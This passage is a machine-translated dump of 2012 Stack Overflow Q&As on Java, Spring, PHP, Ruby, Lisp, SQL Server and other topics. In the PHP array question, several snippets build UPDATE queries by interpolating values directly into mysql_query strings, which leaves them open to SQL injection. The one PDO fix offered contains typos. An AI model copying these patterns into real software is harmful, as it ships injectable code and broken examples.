WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
Date: Wed, 12 Dec 2012 14:36:26 GMT
Content-Length: 1344

Much data...

POST /login/ HTTP/1.1
Content-Length: 21
Content-Type: application/x-www-form-urlencoded
Host: example.com
Connection: Keep-Alive
Authorization: NTLM AAABBBCCC...FFF==
data=... 
```

我认为第一个请求绝对没用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T08:39:42.337

我的解决方案是这里：

```
public class PreemptiveNTLMHeader implements Header {
    private HttpRequest request;
    private NTCredentials ntc;

    public PreemptiveNTLMHeader(HttpRequest request, NTCredentials ntc) {
        this.request = request;
        this.ntc = ntc;
    }

    /* (non-Javadoc)
     * @see org.apache.http.Header#getName()
     */
    public String getName() {
        return "Authorization";
    }

    /* (non-Javadoc)
     * @see org.apache.http.Header#getValue()
     */
    public String getValue() {
        request.removeHeader(this);
        try {
            return "NTLM " + new JCIFSEngine().generateType1Msg(ntc.getDomain(), ntc.getWorkstation());
        } catch(NTLMEngineException e) {
            return "Failed";
        }
    }

    /* (non-Javadoc)
     * @see org.apache.http.Header#getElements()
     */
    public HeaderElement[] getElements() throws ParseException {
        return null;
    }
} 
```

使用这种用法：

```
NTCredentials ntc = new NTCredentials("example.com/user:password");
httpPost.addHeader(new PreemptiveNTLMHeader(httpPost, ntc)); 
```

DefaultHttpClient 也会发送一个`Authorization: NTLM AAA...`跳过初始请求的标头。在第一次使用此标头后，此标头会自行删除，以避免此虚拟标头覆盖真正的身份验证过程。这对我有用。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-12T14:32:46.920

NTLM 身份验证不能抢先执行。这是一个复杂的方案，涉及多 (3) 次消息交换。

# drupal - Drupal 7：使用前几页上的选择来生成正确的寻呼机？

> ID：13841089
> 
> 赞同：1
> 
> 时间：2012-12-12T13:40:28.790
> 
> 标签：drupal, drupal-7, pagination

我正在使用 Drupal 7 中的页面管理器和面板制作画廊。

画廊中的每一幅画都与一位画家、一个时期和几个主题有关。

在画廊中导航时，用户可以通过三种不同的路线到达特定的画作：

1.  通过画家
2.  通过时间段
3.  通过主题

当在特定绘画的页面上时，我想制作一个分页系统，根据用户到达特定绘画的路线显示下一幅和上一幅画。

因此，如果您通过画家到达带有绘画的页面，则下一个和上一个按钮应该显示该画家的下一幅和上一幅画。

如果您通过时间段到达带有绘画的页面，则下一个和上一个按钮应显示特定时间段的下一个和上一个绘画。

如果您通过主题进入带有绘画的页面，则下一个和珍贵的按钮应该显示该特定主题的下一个和上一个绘画。

每幅画只有一个 url：/painting/%node，所以我需要知道用户通过什么路线到达特定画作，以便生成正确的上一个和下一个按钮。

有人知道这样做的聪明方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T11:43:37.073

加载页面后，通过 ajax/javascript 将图库放入页面，这样您可以使用 javascript History 对象并将其作为参数发送到视图。

# java - Java中的内部FutureTask

> ID：13841096
> 
> 赞同：2
> 
> 时间：2012-12-12T13:40:42.010
> 
> 标签：java

我尝试实现一个内部方法，以便在新线程中执行以下代码

```
MyPojo result = null;
final MyPojo result2 = result;

FutureTask<MyPojo> runnableTask = new FutureTask<MyPojo>(
    new Runnable() {  

        BindJSON<MyPojo> binding;

        // Make the URL at which the product list is found
        String sourceURLString = 
            "http://www.....ca/files/{CAT_ID}.json";                

        @Override
        public void run() {  
            sourceURLString = sourceURLString.replace("{CAT_ID}", catId);
            binding = new BindJSON<MyPojo>();  
            result2 = binding.downloadData(sourceURLString, MyPojo.class);  
        }  
    }, 
    result2);

runnableTask.run(); 
```

所以，现在我收到一条错误消息：无法分配最终的局部变量 result2，因为它是在封闭类型中定义的。我看一下这个答案：[Cannot reference a non-final variable i inside an internal class defined in a different method](https://stackoverflow.com/questions/5997953/cannot-refer-to-a-non-final-variable-i-inside-an-inner-class-defined-in-a-differ)但它对我不起作用。我应该怎么做才能完成这项工作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T13:53:08.977

您可能想使用 a [`Callable`](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/Callable.html)，而不是 a `Runnable`：

```
// the variable holding the result of a computation
String result = null;

FutureTask<String> runnableTask = new FutureTask<String>(
        new Callable<String>() {
            public String call() throws Exception {
                // (asynchronous) computation ...
                return "42";
            }
        });

System.out.println("result=" + result); // result=null

// this will invoke call, but it will all happen in the *same thread*
runnableTask.run();

// to have a parallel thread execute in the 'background'
// you can use java.util.concurrent.Executors
// Note: an ExecutorService should be .shutdown() properly
// Executors.newSingleThreadExecutor().submit(runnableTask);

// waits for the result to be available
result = runnableTask.get();

// you can also add timeouts:
// result = runnableTask.get(100, TimeUnit.MILLISECONDS);

System.out.println("result=" + result); // result=42 
```

*   执行者： http: [//docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/Executors.html](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/Executors.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T13:52:51.303

您对 FutureTask 的使用不是很有用，因为您在同一个线程中执行它。您可以使用执行程序并提交可调用来实现您想要的：

```
 ExecutorService executor = Executors.newFixedThreadPool(1);

    Callable<MyPojo> task = new Callable<MyPojo> () {
        BindJSON<MyPojo> binding;
        // Make the URL at which the product list is found
        String sourceURLString = "http://www.....ca/files/{CAT_ID}.json";

        @Override
        public MyPojo call() {
            sourceURLString = sourceURLString.replace("{CAT_ID}", catId);
            binding = new BindJSON<MyPojo>();
            return binding.downloadData(sourceURLString, MyPojo.class);
        }
    };

    Future<MyPojo> future = executor.submit(task);
    MyPojo result = future.get(); 
```

注意：调用`future.get();`将阻塞，直到任务完成。

# java - Spring Java - 运行进程每天执行一次任务

> ID：13841099
> 
> 赞同：3
> 
> 时间：2012-12-12T13:40:48.950
> 
> 标签：java, spring, spring-mvc, scheduled-tasks

我有一个小问题（我使用的是 spring 版本 3.1.1）。我想在一天内启动一个执行任务的进程或线程。

例如：我有一个用户列表，每个用户都有一个总天数作为字段。

类用户{字符串...字符串...日期时间countDays = ...12-12-12...}

所以我想要做的是，当我启动我的应用程序（运行）时，我想每天执行一项任务：遍历用户列表检查 countDays 如果 countDays 大于 14 例如发送一些东西给用户...... .

我确实知道如何循环并发送一些东西。我不知道如何启动一个对象并让它在一天内执行一项任务。创建一个bean，构造它并使用睡眠功能？？？

希望有人能帮帮我，谢谢！:D

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T13:59:47.410

您还可以使用类似于以下的@Scheduled 注解：

```
@Scheduled(cron="0 0 * * *")
public void doStuff() {
   ..
} 
```

在这里检查 decumentation：[有很多不同的方法可以做到这一点](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/scheduling.html)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T13:42:05.723

Spring 对 Quartz 调度器的支持非常好……

[http://static.springsource.org/spring/docs/3.0.x/reference/scheduling.html](http://static.springsource.org/spring/docs/3.0.x/reference/scheduling.html)

您可以使用 CRON 触发器 bean 将任务设置为每天运行一次（例如在午夜）

```
<bean id="cronTrigger" class="org.springframework.scheduling.quartz.CronTriggerBean">
    <property name="jobDetail" ref="usersJob" />
    <property name="cronExpression" value="0 0 * * *" />
</bean> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T14:04:16.153

利用 Spring 的[TaskScheduler](http://static.springsource.org/spring/docs/current/javadoc-api/org/springframework/core/task/TaskExecutor.html)和[Trigger](http://static.springsource.org/spring/docs/current/javadoc-api/org/springframework/scheduling/Trigger.html)接口。TaskScheduler 负责调度任务（Runnable 对象）执行，Trigger 负责确定执行时间。

对于您的情况，TaskScheduler 的[ThreadPoolTask​​Scheduler](http://static.springsource.org/spring/docs/current/javadoc-api/org/springframework/scheduling/concurrent/ThreadPoolTaskScheduler.html)实现应该绰绰有余。它将 java.util.concurrent.ThreadPoolExecutor 改编为 TaskScheduler。

对于触发器实现，[CronTrigger](http://static.springsource.org/spring/docs/current/javadoc-api/org/springframework/scheduling/support/CronTrigger.html)非常适合您的需求。它可用于创建触发策略，以便每天在同一时间执行任务。

示例 Java 代码：

```
Runnable task = /* your task */
TaskScheduler scheduler = new ThreadPoolTaskScheduler();
scheduler.schedule(task, new CronTrigger("0 0 * * *")); 
```

# php - 如何强制 K2 注册而不是 joomla 注册？

> ID：13841100
> 
> 赞同：3
> 
> 时间：2012-12-12T13:40:52.587
> 
> 标签：php, joomla, registration, joomla-k2

我有一个基于 joomla & k2 的网站。当用户使用标准 joomla 表单注册到站点时，k2 不会将用户分配到任何组，因此用户无法提交项目。我的问题是：如何强制 joomla 将用户重定向到 k2 注册表并禁用标准注册表？谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T15:35:21.223

在 Joomla 后端，转到`Components >> K2`然后单击**参数**按钮并转到**高级**选项卡。在那里，您会找到一个名为**Enable K2 User Profile**的参数，您需要确保将其设置为“ **yes** ”。

完成后，假设您使用的是标准的 Joomla 注册组件视图，请编辑与注册表相关联的菜单项，更改“**类型**”并将其设置为 K2 注册表

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:49:14.273

要启用 k2，只需将 k2 登录管理器设置为当前登录表单所在的所有位置。

要禁用 Joomla 用户名，请遵循[此处](http://docs.joomla.org/Disabling_user_registration)的 Joomla 文档。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-13T06:57:16.290

使用 k2 注册创建菜单，而不是使用 joomla 默认的 com_users。

# ruby - 通过 Ruby 路边的 Bing 搜索 API

> ID：13841104
> 
> 赞同：1
> 
> 时间：2012-12-12T13:41:01.660
> 
> 标签：ruby, azure, bing-api

我正在尝试获取查询的 Bing 搜索结果。我正在使用 Ruby 和`curb`，但无法从 API 服务器返回任何结果。我总是得到`400 Bad Request`。

这就是 API 文档对 PHP 所说的 ![在此处输入图像描述](../Images/cc2072266e11c8d3f540ed9d780cc2e1.png)

这是我的代码：

```
require 'curb'
require 'base64'

acctKey = "something"
authKey = Base64.encode64("#{acctKey}:#{acctKey}")
http = Curl.get("https://api.datamarket.azure.com/Bing/Search/Web?$format=json&Query=%27Xbox%27") do |http|
    http.headers['Authorization'] = "Basic #{authKey}"
    http.headers['request_fulluri'] = true
    http.headers['ignore_errors'] = false
    http.verbose = true
end 
```

结果如下：

```
* About to connect() to api.datamarket.azure.com port 443 (#0)
*   Trying 157.55.194.132...
* Connected to api.datamarket.azure.com (157.55.194.132) port 443 (#0)
* Connected to api.datamarket.azure.com (157.55.194.132) port 443 (#0)
* SSL connection using AES128-SHA
* Server certificate:
*    subject: C=US; ST=WA; L=Redmond; O=Microsoft; OU=STBOS-Clouddb; CN=api.datamarket.azure.com
*    start date: 2012-08-31 18:37:12 GMT
*    expire date: 2013-07-31 21:26:57 GMT
*    common name: api.datamarket.azure.com (matched)
*    issuer: DC=com; DC=microsoft; DC=corp; DC=redmond; CN=Microsoft Secure Server Authority
*    SSL certificate verify ok.
> GET /Bing/Search/Web?$format=json&Query=%27Xbox%27& HTTP/1.1
Host: api.datamarket.azure.com
Accept: */*
request_fulluri: true
ignore_errors: false
Authorization: Basic ...

< HTTP/1.1 400 Bad Request
< Content-Type: text/html; charset=us-ascii
< Server: Microsoft-HTTPAPI/2.0
< Date: Wed, 12 Dec 2012 13:30:22 GMT
< Connection: close
< Content-Length: 339
< 
* Closing connection #0 
```

会出什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:02:26.313

试试这个：

```
require 'curb'
require 'base64'

acctKey = "<YOUR KEY>"
authKey = Base64.strict_encode64("#{acctKey}:#{acctKey}")
http = Curl.get("https://api.datamarket.azure.com/Bing/Search/Web", {:$format => "json", :Query => "'Xbox'"}) do |http|
    http.headers['Authorization'] = "Basic #{authKey}"
    http.verbose = true
end

puts http.body_str 
```

注意几件事：

1.  `Base64.encode64`返回一个带换行符的字符串。`strict_encode64`会避免这个问题。（您也可以只删除换行符。）
2.  我无法将查询参数直接放在 URL 中。我只是将参数移到哈希中，这可能是更典型的方法。
3.  （*编辑*）我还取出了两个虚假标题“request_fulluri”和“ignore_errors”。我不认为这些是 Perl 代码中的实际标题。我没有尝试将它们留在里面，所以也许它们是无害的，但我认为您不需要它们。

# ios - 使用带有自签名证书的 NSURLConnection 进行 SSL

> ID：13841108
> 
> 赞同：3
> 
> 时间：2012-12-12T13:41:21.150
> 
> 标签：ios, ssl, https, nsurlconnection

我正在使用`NSURLConnection`与我的服务进行 HTTPS (SSL) 通信。

我试图阻止“中间人”场景（窃取数据的 SSL 代理），在自签名服务器 SSL 身份验证中。

StackOverflow 充满了允许任何证书的解决方案，这还不够好。其中一些解决方案还测试主机 url，但同样，这还不够好，因为伪造 DNS 地址非常容易。

我记得，openSSL 允许您使用 CA 文件来识别服务器。你知道怎么做`NSURLConnection`吗？

# visual-studio-2012 - 将文件添加到 VS2012 项目模板？

> ID：13841109
> 
> 赞同：2
> 
> 时间：2012-12-12T13:41:21.380
> 
> 标签：visual-studio-2012, project-template

我正在为 C++ 控制台应用程序创建一个 VS2012 项目模板，该模板是根据公司需求定制的。

其中一件事是它需要有一个自定义的 .props 文件，我将其添加到 VS 在您基于现有项目导出模板时创建的 .zip 文件中。

但是，似乎将此文件添加到 zip 并在`<ProjectItem>`.vstemplate 文件的标记中提及它，并没有使 VS 在基于此模板的项目时意识到它也应该*复制*此文件。

如何将文件添加到自定义 VS2012 项目模板并确保 VS 将它们复制到基于它的任何项目？

# javascript - 画布动画的 requestAnimFrame 或 setInterval？

> ID：13841115
> 
> 赞同：2
> 
> 时间：2012-12-12T13:41:51.540
> 
> 标签：javascript, jquery, html, canvas

哪个最适合画布动画？requestAnimFrame 还是 setInterval ？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T14:13:18.440

`requestAnimationFrame`保证您的动画在浏览器准备好绘制新帧时准确运行。如果您使用`setInterval`，您将面临以下风险：

*   使间隔太短，在这种情况下，您会耗尽电池寿命执行永远不会显示的过于频繁的绘制操作
*   使间隔过长，在这种情况下，您可以通过使用更短的间隔来获得更平滑的动画

`requestAnimationFrame`可以在页面不可见时节流以降低运行频率（这可以节省电池寿命），但一些实现`setInterval`也这样做（目前在 Firefox 和 Chrome 中）。

`requestAnimationFrame`从头开始构建，旨在将其用于动画；`setInterval`旨在执行任何需要定期操作的操作。如果您正在制作动画（尤其是画布动画），我建议您使用`requestAnimationFrame`，并回退到`setInterval`旧浏览器。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-12T16:28:43.870

但是您可以在大函数调用中使用 setInterval ，即 load 并且仅在加载窗口时调用它：

```
function load()
{
   var intervalle = x;
   var game= setInterval(process,intervalle);
   ...

}
window.addEventListener("load",load,true); 
```

# php - 多维数组 php

> ID：13841118
> 
> 赞同：2
> 
> 时间：2012-12-12T13:41:55.327
> 
> 标签：php, arrays, foreach

如果我有以下情况：

```
$a = array(); 
```

然后想在更新查询中使用它的元素，我建议这样做：

```
foreach($a as $value) {

$update = mysql_query("UPDATE tb SET username = '$value'");

} 
```

但是，如果我有很多数组并且想在更新中使用每个数组的一个元素，我该怎么办？

说...

```
$a = array();
$b = array();
$c = array();

$update = mysql_query("UPDATE tb SET username = 'element of a', image = 'element of b', address = 'element of c'..."); 
```

我将如何使用 foreach 来实现这一点。我知道我可以这样做：

```
$d = array($a, $b, $c) 
```

但是，如果这对我有任何帮助，我不知道。

提前感谢您对问题的任何了解...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T13:45:52.273

使用`for`循环。

例子：

```
for($i=0; $i<$array_Length; $i++)
{
    $update = mysql_query("UPDATE tb SET username = '$a[$i], image = '$b[$i]',  address = '$c[$i]'...");
} 
```

$i 是计数器，您只需遍历一个数组中的许多元素（您说它们都相互对应），然后从每个数组中提取相同的元素编号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:48:19.637

如果您在所有数组中使用相同的索引，则可以使用

```
foreach ($a as $key => $value)
{ 
    // do sth. with $value
    // do sth with $b[$key]
} 
```

这类似于史蒂夫的回答，但他要求键是从 0 开始的整数，没有间隙，如果您的键是字符串或其他任何东西，这也将起作用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T13:49:30.083

有趣的是，PHP 5.5[将支持在 中解包多维数组`foreach`](http://php.net/manual/en/control-structures.foreach.php#control-structures.foreach.list)，但您不太可能选择这样做。*假设*所有三个列表的长度相同并且具有相同的键，您将不得不坚持使用普通`for`循环：

 *```
$length = min(count($a), count($b), count($c));
for ($x = 0; $x < $length; $x++) {
   $query = "UPDATE tb SET username = '" . mysql_real_escape_string($a[$x]) ...
} 
```

如果您担心数组没有相同的键，您可以先使用`array_values`它们中的每一个。

* * *

我还将就您不应该如何使用`mysql_*`以及应该如何升级到`PDO`or进行常规发言`mysqli`，这两者都会使您更容易做到这一点：

```
$query = "UPDATE tb SET username = ?, image = ?, address = ?";
$pdo = new PDO;
$stmt = $pdo->prepare($query);
for ($x = 0; $x < $length; $x++) {
   $stmt->execte(array(a[$x], $b[$x], $c[$x]));
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T13:52:00.630

如果这三个`array`具有相同的大小。然后使用`for`循环并更新每个增加的`key`值。

```
 for($i=0;$i<count($a);$i++):

       $option1=$a[$i];
       $option2=$b[$i];
       $option3=$c[$i];         

    endfor; 
```*

# java - 无法使用正确的参数 VB 打开 Jar 文件

> ID：13841124
> 
> 赞同：-1
> 
> 时间：2012-12-12T13:42:23.257
> 
> 标签：java, vb.net, process

我正在开发一个游戏启动器（是的，已经有一个，但我的会有所不同）。问题是，如果您登录，游戏会尝试启动，但我得到一个控制台窗口，显示“无法访问 jarfile c:\users\max korlaar\dropbox\max”，并在 1 毫秒后关闭。我不知道为什么，因为我的 Process Arguments 中给定的 jar 文件在那里，而且我认为 VB.net 对该位置做了一些事情。jar 文件位于文件夹 Bin 中，相对于我的程序。（是的，我尝试用 & 替换 +）

```
Dim process As New Process
Dim info As New ProcessStartInfo
info.FileName = GetJavaHome() + "\java.exe"
info.CreateNoWindow = True
info.UseShellExecute = True
info.RedirectStandardError = False
info.RedirectStandardOutput = False
Dim args As String = "-jar  -natives{1} -lwjgl{2} -mlcfg{3} -mlmod{4} -j{5} -u{6} -s{7}"
info.Arguments = String.Format(args, My.Application.Info.DirectoryPath + "\bin\natives", My.Application.Info.DirectoryPath + "\bin\natives", My.Application.Info.DirectoryPath + "\bin\lwjgl.jar", My.Application.Info.DirectoryPath + "\config\", My.Application.Info.DirectoryPath + "\mods\", My.Application.Info.DirectoryPath + "\bin\minecraft.jar\", TextBox1.Text, result)
info.Arguments = info.Arguments.Replace("\bin\minecraft.jar", My.Application.Info.DirectoryPath + "\bin\minecraft.jar")
process.StartInfo = info
process.Start() 
```

在尝试了一些建议后，我对其进行了一些修改，得到了这个：

```
 Dim process As New Process
    Dim info As New ProcessStartInfo
    info.FileName = GetJavaHome() + "\java.exe"
    info.CreateNoWindow = False
    info.UseShellExecute = False
    info.RedirectStandardError = False
    info.RedirectStandardOutput = True

    'Got error: Corrupt jar file... Someone with Minecraft Experience can help me to launch it?
    Dim args As String = "-jar ""{6}"" -natives ""{1}"" -lwjgl ""{2}"" -mlcfg ""{3}"" -mlmod ""{4}"" -j ""{5}"" -u ""{6}"" -s ""{7}"""
    ' Got CMD window popping up with error and disappearing
    info.Arguments = String.Format(args, "none", My.Application.Info.DirectoryPath & "\bin\natives\", My.Application.Info.DirectoryPath & "\bin\natives", My.Application.Info.DirectoryPath & "\bin\lwjgl.jar", My.Application.Info.DirectoryPath & "\config\", My.Application.Info.DirectoryPath & "\mods\", "'" & Application.StartupPath & "\bin\minecraft.jar'", TextBox1.Text, result)
    'info.Arguments = info.Arguments.Replace("\bin\minecraft.jar", My.Application.Info.DirectoryPath + "\bin\minecraft.jar")
    process.StartInfo = info
    process.Start() 
```

但现在我收到错误：无法访问 jarfile “{path to minecraft.jar (correct path)}” 有人知道为什么吗？以及如何解决该错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T13:46:54.873

你的路径中有一个空格，所以你必须引用它（放在两个之间`"`）。

```
Dim args As String = "-jar  -natives""{1}"" -lwjgl""{2}"" ...etc..etc..." 
```

否则，java 可执行文件将无法正确区分您传递给它的参数。

* * *

如果您的路径是`c:\users\max korlaar\dropbox\max & alex`，并且您没有引用它，则将其传递给 java 可执行文件

> java -jar c:\users\max korlaar\dropbox\max & alex

where only`c:\users\max korlaar\dropbox\max`将用作 to 的参数`java -jar`。

因此，您必须使用引号：

> java -jar "c:\users\max korlaar\dropbox\max & alex"

# binary-tree - Dijkstra 的算法，访问二叉树深度优先顺序

> ID：13841125
> 
> 赞同：1
> 
> 时间：2012-12-12T13:42:24.723
> 
> 标签：binary-tree, dijkstra, depth-first-search

我正在处理一棵二叉树，我想知道如何加权边缘以便以深度优先顺序访问二叉树。
我知道我需要为通向我想首先访问的节点的边分配更少的权重。
但是与节点的深度有关系吗？
干杯。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T14:08:46.800

这听起来像是一个学生的练习。可以使用 Dijkstra 算法首先搜索二叉树深度。树的边缘和深度之间确实存在关系：

```
 A
          1      4
       B             E
     1   2         1   2
   C       D     F      G 
```

在上面的树中，字母代表节点，数字代表加权边。Dijkstra 算法将以深度优先顺序访问这棵树的节点。在这种特定情况下：按字母顺序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:53:11.420

由于 Dijkstra 算法计算每个顶点的前驱之间的分钟数，因此您将始终具有这样的 BFS 行为。例如，您从第一个知道 vertex 开始`A`。没有 pred，值设置为 0。你取它的所有后继，并且对于它们中的每一个，你测试所有前驱的距离和相关值。对我来说，这就像一个 BFS。

# lisp - Lisp：尝试使用 acons 和循环生成 a-list 时出现应用错误

> ID：13841129
> 
> 赞同：3
> 
> 时间：2012-12-12T13:42:35.863
> 
> 标签：lisp, common-lisp

我尝试在 clisp 中运行此代码：

```
(defun gen-world
(loop for x to *hight*
    do (loop for y to *width*
        do (acons '(x . y) '(rock) *world*)))) 
```

并得到以下错误：

```
*** - APPLY: argument list given to SYSTEM::ERROR-OF-TYPE is dotted
  (terminated by
   "Invalid specialized parameter in method lambda list
   (LOOP FOR X TO *HIGHT* DO
    (LOOP FOR Y TO *WIDTH* DO (ACONS '(X . Y) '(ROCK) *WORLD*))): (LOOP FOR Y IN
      *WIDTH* DO (ACONS '(X . Y) '(ROCK) *WORLD*))"
   ) 
```

当我跑

```
(acons '(x . y) '(rock) *world*) 
```

我没有错误

为什么会这样？
编辑：`*hight*` `*width*`并且`*world*`是全球性的并且在范围内。`*world*`是一个列表。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T15:11:17.300

我可以在这里看到两个问题。

1.  您缺少参数列表，因此将`LOOP`表单用作参数列表。它恰好包含一个`(X . Y)`不允许的点对。
2.  `'(X . Y)`当您可能想要一对包含 和 的（整数）*值*时，`X`您的密钥是一个常量`Y`。

试试这个：

```
(defun gen-world ()
    (loop for x to *hight*
        do (loop for y to *width*
            do (acons `(,x . ,y) '(rock) *world*)))) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T13:45:01.847

您的函数定义存在问题，您缺少（空）参数列表：

```
(defun gen-world () <body>) 
```

同样在这一行：

```
(acons '(x . y) '(rock) *world*) 
```

以列表结束表达式：

```
(acons '(x . y) '(rock) (list *world*)) 
```

并确保变量`*hight*`[原文如此]`*width*`和`*world*`在范围内

# sql-server-2008 - 需要有关 sql server 2008 中存储过程的帮助

> ID：13841130
> 
> 赞同：-2
> 
> 时间：2012-12-12T13:42:36.020
> 
> 标签：sql-server-2008, stored-procedures

我有`tblEmployee`列的表`id, name, status`

现在我必须按用户的状态过滤用户，其中`0`代表非活动用户、`1`活动用户、`2`新用户

条件1：我创建了一个这样的存储过程：

```
IF (@Mode = 'ViewActive') 
BEGIN
SELECT * 
    FROM [tblEmployee] 
    WHERE Status = 1 
    ORDER BY DepartmentId, DOJ
END 
```

这是查看活跃用户

条件二：

同样，我想为活动用户和新用户创建条件以同时显示两者

我努力了

```
IF (@Mode='ViewActive') 
BEGIN
SELECT * 
    FROM [tblEmployee] 
    WHERE Status = 1, 2 
END 
```

显示错误。

请帮我定义第二个条件..任何新方法对我也有帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T13:46:10.997

干得好：

```
IF (@Mode='ViewActive') 
BEGIN
SELECT * FROM [tblEmployee] WHERE Status in (1, 2 )
END 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T13:45:16.797

将该行更改为：

```
SELECT * FROM [tblEmployee] WHERE Status IN(1, 2) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-12T13:45:43.770

```
SELECT * FROM [tblEmployee] WHERE Status IN (1, 2) 
```

# ruby-on-rails - rails服务器错误，在第一次启动期间

> ID：13841138
> 
> 赞同：1
> 
> 时间：2012-12-12T13:42:57.417
> 
> 标签：ruby-on-rails

我是 rails 新手，所以在启动 rails 服务器时我有一个愚蠢的问题，我遇到了这个错误

```
rails s
/var/lib/gems/1.8/gems/execjs-1.4.0/lib/execjs/runtimes.rb:51:in `autodetect': Could not find a JavaScript runtime. See https://github.com/sstephenson/execjs for a list of available runtimes. (ExecJS::RuntimeUnavailable)
    from /var/lib/gems/1.8/gems/execjs-1.4.0/lib/execjs.rb:5
    from /var/lib/gems/1.8/gems/coffee-script-2.2.0/lib/coffee_script.rb:1:in `require'
    from /var/lib/gems/1.8/gems/coffee-script-2.2.0/lib/coffee_script.rb:1
    from /var/lib/gems/1.8/gems/coffee-script-2.2.0/lib/coffee-script.rb:1:in `require'
    from /var/lib/gems/1.8/gems/coffee-script-2.2.0/lib/coffee-script.rb:1
    from /var/lib/gems/1.8/gems/coffee-rails-3.2.2/lib/coffee-rails.rb:1:in `require'
    from /var/lib/gems/1.8/gems/coffee-rails-3.2.2/lib/coffee-rails.rb:1
    from /var/lib/gems/1.8/gems/bundler-1.2.3/lib/bundler/runtime.rb:68:in `require'
    from /var/lib/gems/1.8/gems/bundler-1.2.3/lib/bundler/runtime.rb:68:in `require'
    from /var/lib/gems/1.8/gems/bundler-1.2.3/lib/bundler/runtime.rb:66:in `each'
    from /var/lib/gems/1.8/gems/bundler-1.2.3/lib/bundler/runtime.rb:66:in `require'
    from /var/lib/gems/1.8/gems/bundler-1.2.3/lib/bundler/runtime.rb:55:in `each'
    from /var/lib/gems/1.8/gems/bundler-1.2.3/lib/bundler/runtime.rb:55:in `require'
    from /var/lib/gems/1.8/gems/bundler-1.2.3/lib/bundler.rb:128:in `require'
    from /home/gorysko/rails/rails_project/first_app/config/application.rb:7
    from /var/lib/gems/1.8/gems/railties-3.2.9/lib/rails/commands.rb:53:in `require'
    from /var/lib/gems/1.8/gems/railties-3.2.9/lib/rails/commands.rb:53
    from /var/lib/gems/1.8/gems/railties-3.2.9/lib/rails/commands.rb:50:in `tap'
    from /var/lib/gems/1.8/gems/railties-3.2.9/lib/rails/commands.rb:50
    from script/rails:6:in `require'
    from script/rails:6 
```

但是所有的安装都是按照书中所写的，所有的依赖也都很好

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T13:46:14.347

尝试将此行添加到您的 gemfile

```
gem 'therubyracer' 
```

它允许您从 Ruby 中评估 JavaScript。你可以在[这里查看](https://github.com/cowboyd/therubyracer)。

# google-app-engine - 为什么我需要增强数据类？

> ID：13841140
> 
> 赞同：2
> 
> 时间：2012-12-12T13:43:04.313
> 
> 标签：google-app-engine, jpa, datanucleus

对不起，如果这是一个菜鸟问题。我一直在阅读谷歌应用引擎入门指南，但我不明白这个增强过程是做什么的？[https://developers.google.com/appengine/docs/java/datastore/jpa/overview-dn2#Enhancing_Data_Classes](https://developers.google.com/appengine/docs/java/datastore/jpa/overview-dn2#Enhancing_Data_Classes)
我尝试在不执行的情况下运行，一切似乎都正常。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T13:46:55.113

谷歌页面有链接到所有解释它的相关地方，例如[http://db.apache.org/jdo/enhancement.html](http://db.apache.org/jdo/enhancement.html)

不，如果你不这样做，那么*一切都不会好*。

# arrays - 将数组变成一个 foreach 循环？

> ID：13841145
> 
> 赞同：1
> 
> 时间：2012-12-12T13:43:13.147
> 
> 标签：arrays, wordpress, foreach

我的 PHP 知识有限，目前我有这个：

```
$Name= simple_fields_values('Name');
$Description= simple_fields_values('Description');
$Price= simple_fields_values('Price'); 

foreach ($Name as $key_name => $key_value) {
print  $key_value ;
}
foreach ($Description as $key_name => $key_value) {
print $key_value ;
}
foreach ($Price as $key_name => $key_value) {
print $key_value;
} 
```

我只是想知道我是否可以将其组合成 1 个 foreach 循环...我确定有办法，我只是不知道！

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T13:50:21.157

您可以使用合并所有这三个数组`array_merge`，然后您可以在单个`foreach`循环中使用合并的数组。

例如，

```
$Name= simple_fields_values('Name');
$Description= simple_fields_values('Description');
$Price= simple_fields_values('Price');

$merge = array_merge($Name,$Description,$Price);

foreach ($merge as $key_name => $key_value) {
print $key_value ;
} 
```

# asp.net-web-api - 具有返回类型的多态性：派生类被序列化

> ID：13841147
> 
> 赞同：1
> 
> 时间：2012-12-12T13:43:26.777
> 
> 标签：asp.net-web-api

当我有这样的控制器方法时：

```
 public IQueryable<ClassBase> Get()
    {           
    } 
```

并且我返回 ClassBase 派生类的 IQueryable，序列化程序序列化派生类并传输派生类（我只测试了 JSON）这不是我想要/期望的。

有没有办法只获得基类的输出？

* * *

## 回答 #1

